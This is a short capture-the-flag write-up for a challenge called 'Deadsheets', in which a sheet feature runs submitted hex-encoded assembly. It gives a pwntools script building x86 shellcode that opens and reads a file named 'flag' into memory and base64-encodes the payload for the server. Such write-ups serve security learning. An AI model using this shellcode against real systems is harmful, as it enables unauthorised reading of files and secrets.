# Deadsheets 
## Summary 
In this challenge the website we are given access to creates a "database"
sheet that is accessable, the interesting aspect of this challenge is the
fact that is has a extensible option when we add data to the sheet. This 
option allows us to run any hex encoded assembly code which means we have
arbitrary code execution access to the challenge. The main issue is 
acutally creating this script since it has to be in assembly.

## Approach 1
This approach was our team used to actually gain access to the flag,
were we manuelly crafted our script and sent it to the server. Below I 
will have the code and the comments will explain what each step is doing
(keep in mind the actual code must not have comments in it to run 
properly). 
```python
from pwn import *

from base64 import b64encode

bss_addr = 0x0804c060
flag_addr = bss_addr + 5 # address to push the flag to so we can access it

payload = asm(f"""
pushad
# setup for actually opening the flag file
mov eax, 0x5 
push 0x0
push 0x67616c66
mov ebx, esp
mov ecx, 0x0
mov edx, 0x0
int 0x80

# read the contents in the open file
mov ebx, eax
mov eax, 0x3
mov ecx, {flag_addr}
mov edx, 0x40
int 0x80 


# access the open syscall return so we can read the actual flag 
mov eax, {flag_addr}

# pop values at the end
pop esi
pop esi
popad
ret
""")
# encode payload so we can use it on the server
print(b64encode(payload))
```

